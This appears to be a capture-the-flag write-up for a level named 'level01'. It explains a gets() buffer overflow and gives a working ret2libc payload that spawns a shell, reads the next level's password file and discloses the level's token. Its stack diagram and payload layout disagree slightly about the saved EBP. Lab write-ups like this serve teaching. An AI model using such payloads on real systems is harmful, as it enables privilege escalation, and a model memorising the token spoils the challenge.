# level01

1. Decompilation with Ghidra

    - Decompile the `level1` binary with Ghidra
    - The binary contains a simple function that calls `gets()` to read user input into a 76-byte buffer
    - No bounds checking, making it vulnerable to **buffer overflow**

2. Analysis of the vulnerability

    The code is:

    ```c
    void main(void) {
      char local_50 [76];  // 76 bytes buffer
      gets(local_50);      // Reads without size limit!
      return;
    }
    ```

    The vulnerability allows us to overflow the buffer and overwrite the **return address** on the stack.

3. Finding the required addresses with Ghidra

    - **`system()` address in PLT** : `0x08048360`
    - **`/bin/sh` string address** : `0x08048584`

    Stack layout when overflowing:

    ```
    Buffer (76 bytes) | Saved EBP (4 bytes) | Return Address (4 bytes)
      [AAAA...AAAA]   +       [????]        +    [system address]
    ```

    Payload structure:
    - 76 bytes of padding (A's)
    - 4 bytes: address of `system()` (little-endian: `\x60\x83\x04\x08`)
    - 4 bytes: junk/return address for `system()`
    - 4 bytes: argument for `system()` = address of `/bin/sh` (little-endian: `\x84\x85\x04\x08`)

4. Exploitation

    ```bash
    (printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x60\x83\x04\x08XXXX\x84\x85\x04\x08'; cat) | ./level1
    ```

    This spawns a shell with level2 privileges.

    ```bash
    cat /home/user/level2/.pass
    ```

5. Token discovered

    The token is : `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
